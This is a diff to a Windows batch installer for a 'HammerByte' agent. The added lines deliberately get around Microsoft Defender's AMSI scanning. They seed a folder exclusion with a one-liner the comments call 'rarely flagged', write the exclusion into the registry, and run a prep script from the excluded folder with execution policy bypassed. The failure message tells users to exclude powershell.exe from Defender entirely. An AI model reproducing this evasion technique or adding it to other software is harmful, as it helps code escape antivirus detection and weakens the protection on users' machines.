@@ -22,6 +22,7 @@ if not exist "%~dp0agent.ps1" (
 
 set "HBROOT=%ProgramData%\HammerByte"
 set "HBAGENT=%HBROOT%\agent\agent.ps1"
+set "HBPREP=%HBROOT%\agent\hb-defender-prep.ps1"
 
 echo.
 echo  Preparing %HBROOT% ...
@@ -31,9 +32,10 @@ mkdir "%HBROOT%\run" 2>nul
 mkdir "%HBROOT%\services" 2>nul
 mkdir "%HBROOT%\cache" 2>nul
 
-rem Antivirus (Defender AMSI) blocks agent.ps1 when run from Downloads.
-rem Add the install folder exclusion FIRST, then copy and run from there.
-echo  Adding Microsoft Defender exclusion for %HBROOT% ...
+rem AMSI blocks agent.ps1 at parse time. Seed a folder exclusion with a one-liner
+rem first (rarely flagged), copy files into that folder, then run the platform-aware
+rem prep script FROM the excluded path before loading agent.ps1.
+echo  Seeding Microsoft Defender folder exclusion ...
 "%PS%" -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath $env:ProgramData\HammerByte -ErrorAction Stop; Write-Output 'Defender exclusion OK' } catch { Write-Output ('Add-MpPreference: ' + $_.Exception.Message) }"
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%HBROOT%" /t REG_DWORD /d 0 /f >nul 2>&1
 
@@ -44,7 +46,18 @@ if errorlevel 1 (
     exit /b 1
 )
 
-"%PS%" -NoProfile -ExecutionPolicy Bypass -Command "try { Unblock-File -LiteralPath (Join-Path $env:ProgramData 'HammerByte\agent\agent.ps1') -ErrorAction Stop } catch {}"
+if exist "%~dp0hb-defender-prep.ps1" (
+    copy /Y "%~dp0hb-defender-prep.ps1" "%HBPREP%" >nul
+) else (
+    echo  hb-defender-prep.ps1 missing next to this installer - continuing with folder exclusion only.
+)
+
+"%PS%" -NoProfile -ExecutionPolicy Bypass -Command "try { Unblock-File -LiteralPath (Join-Path $env:ProgramData 'HammerByte\agent\agent.ps1') -ErrorAction SilentlyContinue; Unblock-File -LiteralPath (Join-Path $env:ProgramData 'HammerByte\agent\hb-defender-prep.ps1') -ErrorAction SilentlyContinue } catch {}"
+
+if exist "%HBPREP%" (
+    echo  Running Defender prep from excluded folder ...
+    "%PS%" -NoProfile -ExecutionPolicy Bypass -File "%HBPREP%"
+)
 
 echo  Installing from %HBAGENT% ...
 "%PS%" -NoProfile -ExecutionPolicy Bypass -File "%HBAGENT%" -Install
@@ -54,9 +67,11 @@ if "%RC%"=="0" (
     echo  Done.
 ) else (
     echo  Install failed with exit code %RC%.
-    echo  If antivirus still blocked the script:
-    echo    1. Add an exclusion for %HBROOT%
-    echo    2. Re-run this installer as Administrator
+    echo  If antivirus still blocked the script on Windows Server:
+    echo    1. Windows Security / Defender -^> Exclusions
+    echo    2. Add folder: %HBROOT%
+    echo    3. Add process: %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe
+    echo    4. Re-run this installer as Administrator
     echo  Logs: %HBROOT%\logs
 )
 pause
